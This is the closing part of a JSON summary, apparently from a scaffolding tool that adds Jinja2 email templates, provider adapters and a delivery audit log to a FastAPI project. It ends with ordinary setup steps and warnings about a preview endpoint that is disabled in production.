    "migration_head": "add_email_templates",
    "tenant_aware": false
  },
  "notes": [
    "Email templates added: Jinja2 renderer, provider adapters (resend/postmark/smtp, lazy-imported), 4 built-in templates (welcome, password_reset, email_verification, receipt) with HTML + plaintext + subject triples.",
    "EmailDelivery audit model persists every send attempt with a REDACTED recipient.",
    "GET /email/preview/{template_name} is available only outside production (gated on settings.ENVIRONMENT).",
    "GET /email/deliveries/me lists the current user's email deliveries.",
    "Default provider: resend.  Switch at runtime via EMAIL_PROVIDER env."
  ],
  "next_steps": [
    "pip install -r requirements.txt  # ensures jinja2 is installed",
    "Install your chosen provider SDK only when needed: `pip install resend` or `pip install postmark`.",
    "alembic upgrade head",
    "Set EMAIL_FROM + provider API key (RESEND_API_KEY / POSTMARK_API_KEY / SMTP_* envs) in .env.",
    "Restart the FastAPI app so the /email/* routes are loaded.",
    "In dev, preview: GET /api/v1/email/preview/welcome?locale=en"
  ],
  "warnings": [
    "Provider SDKs (resend, postmarker) are NOT installed by this tool. `pip install resend` or `pip install postmark` only when you actually use them — the adapters import lazily.",
    "The preview endpoint is blocked in production by default. Set EMAIL_PREVIEW_ENABLED_IN_PROD=true ONLY on internal deployments with an auth gate in front."
  ]
}
```

---

*TOOL-055 `add_email_templates` — SPEC v2 rigorous, 2026-04-15*
